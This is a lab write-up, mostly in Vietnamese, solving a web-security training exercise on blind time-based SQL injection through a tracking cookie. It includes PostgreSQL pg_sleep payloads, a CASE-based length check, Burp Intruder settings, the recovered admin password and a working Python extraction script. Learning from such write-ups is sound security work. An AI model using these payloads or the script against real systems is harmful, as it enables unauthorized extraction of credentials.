# Lab: Blind SQL injection with time delays and information retrieval

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

# Overview:

Theo tiêu đề của lab, chúng ta sẽ thực hiện tấn công SQL mà kết quả trở về có độ trễ. Từ đó ta có thêm thời gian thực thi câu lệnh SQL để thực hiện các cuộc tấn công khác.

Goal của chúng ta là cần inject query đối với time delays thích hợp.

Cheat sheet, time-delay mà lab đưa ví dụ khá là nhiều cho các version database. Vì ko biết sử dụng cái nào mình phải mò từng cái

```
Oracle: dbms_pipe.receive_message(('a'),10)
Microsoft: WAITFOR DELAY '0:0:10'
PostgreSQL: SELECT pg_sleep(10)
MySQL: SELECT sleep(10) 
```

# Solution:

```
SELECT trackingId FROM someTable WHERE trackingId = 'vvv' || (<CODE HERE>) || ''
```

**vvv là giá trị của cookie**

Kí tự đầu tiên được inject vào là `'` sau `vvv`, sau đó mình nối với output của code. Tiếp theo là nối với `'`. Đối với Oracle và PostgreSQL, `||` được sử dụng để ghép nối, với Microsoft `+` và  MySQL là `khoảng trắng`.

Đồi với PostgreSQL inject `'||(SELECT pg_sleep(10))||'`, query cần thời gian giải để hoàn thành: 10.241s. Thường thì đối với mình, query mất khoảng 240millis.Vậy thêm 10 đến từ việc inject

![image](https://user-images.githubusercontent.com/115911041/234800969-b0ba8d28-7555-4c02-94a4-c91e27544904.png)


## Xác định tên table và column cũng như là username:

Bây giờ ta đã biết database đang chạy version nào, bước tiếp theo:

- Xác định table `users` có tồn tại hay không

- Xác định columns `username` và `password`

- Tìm Entry của username `administrtor`

Mình đã giảm xuống delay đến 3 secs để cho nó tiện hơn.

`'||(SELECT pg_sleep(3) FROM users LIMIT 1)||'`

![image](https://user-images.githubusercontent.com/115911041/234802100-7a17b2a6-0262-4c8f-bfb1-40b98f5e3d28.png)

`'||(SELECT pg_sleep(3)||username||password FROM users LIMIT 1)||'`

![image](https://user-images.githubusercontent.com/115911041/234802664-9461a3b5-b35c-49a8-b45d-fcddb8035404.png)

`'||(SELECT pg_sleep(3)||username||password FROM users WHERE username='administrator')||'`

![image](https://user-images.githubusercontent.com/115911041/234802886-5d458454-fe78-47af-9dce-7e6013a61514.png)

Cả 3 query đều hơn 3 secs, trong khi sử dụng các tên table khác nhau hoặc cột hoặc sử dụng tên username, thì phản hồi có ngay.

Vậy table có tồn tại với column `username` và `password`, bao gồm entry cho `administrator` như là username.

## Xác định độ dài của password

```
'SELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- 
```

Nếu có tồn tại username  `administrator` và độ dài của chuỗi password > 1 thì khi đó, kết quả trả về sẽ có độ trễ.

![image](https://user-images.githubusercontent.com/115911041/235216254-c7662cbe-9f7d-4dd6-a168-1ce1eb14720d.png)

![image](https://user-images.githubusercontent.com/115911041/235216375-731a14d0-67e8-4b9f-bb39-95817bc22adf.png)

![image](https://user-images.githubusercontent.com/115911041/235216474-37fa7754-dd1d-4eab-963a-ae1efe8e1c58.png)

Vậy độ dài của password là 20

# Liệt kê password

Để liệt kê password thì khá đơn giản, chỉ bằng cách kiểm tra từng kí tự của passowrd thay vì độ dài. Mình sử dụng resource pool cũ giống ở trên

`'||(SELECT pg_sleep(3) FROM users WHERE username='administrator' AND SUBSTR(password,1,1)='a')||'`

![image](https://user-images.githubusercontent.com/115911041/235217181-7192945f-2b07-42a5-9351-772297509ffa.png)

Sử dụng Burp Intruder, Attack Type: **Cluster bomb**

Payload 1: numeric

Payload 2: brute force

![image](https://user-images.githubusercontent.com/115911041/235286093-e926ec6d-f5f6-4758-81e4-d26a879bcf4e.png)

`password:ecei5oyr7agz3f1acqgc`

Đăng nhập lại

![image](https://user-images.githubusercontent.com/115911041/235286183-e45db7d8-eefd-43e5-8004-d4ecceb51c72.png)

# Script python
```
import requests
import string
from requests.exceptions import Timeout

characters = list(string.ascii_lowercase)
characters += list(string.digits)
url = "https://0ae6000204e96b3d80083aee008e003f.web-security-academy.net/" #Target URL
length = 20
result = ''

print("[+] Extracting Password")

for i in range(1, length+1):
    found_char = False
    for char in characters:
        payload = f"a'||(SELECT CASE WHEN (username='administrator' AND SUBSTR(password,{i},1)='{char}') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users)||'"
        print(f"Trying number {i} with character: {char}")
        cookie = {"TrackingId":payload}
        try:
            response = requests.get(url, cookies=cookie, timeout=2.5)
            if response.status_code != 200:
                print("[+] Got non-200 status code: ", response.status_code)
                continue
        except Timeout:
            found_char = True
            result += char
            print("[+] Found character:", char)
            break

    if not found_char:
        print(f"[+] Could not find character at position {i}")
        break

print("[+] Password is: ", result)

```


